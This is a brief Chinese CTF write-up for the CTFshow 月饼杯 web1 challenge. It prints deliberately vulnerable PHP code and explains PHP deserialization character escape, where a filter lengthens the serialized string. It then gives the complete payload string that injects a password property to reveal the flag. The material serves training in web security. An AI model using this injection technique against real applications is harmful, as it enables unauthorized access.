---
{"dg-publish":true,"title":"CTFshow_月饼杯_web1_此夜圆","dg-path":"安全/靶场/CTFshow_月饼杯_web1_此夜圆.md","permalink":"/安全/靶场/CTFshow_月饼杯_web1_此夜圆/","dgPassFrontmatter":true}
---

```php
<?php
error_reporting(0);

class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
            if($this->password==='yu22x')
            {
                include('flag.php');
                echo $flag; 
            }
            else
            {
                echo 'wrong password';
            }
        }
    }

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```
这题是**PHP反序列化**的题目
考点是 **字符逃逸** 字符增多

这里的字符过滤是将`Firebasky`过滤为`Firebaskyup`
也就是9个字符转化为11个字符

我们需要在uname中包含下面内容：
```
";s:8:"password";s:5:"yu22x";}
```
这一共是30个字符，所以我们要包含15个`Firebasky`

```
FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```


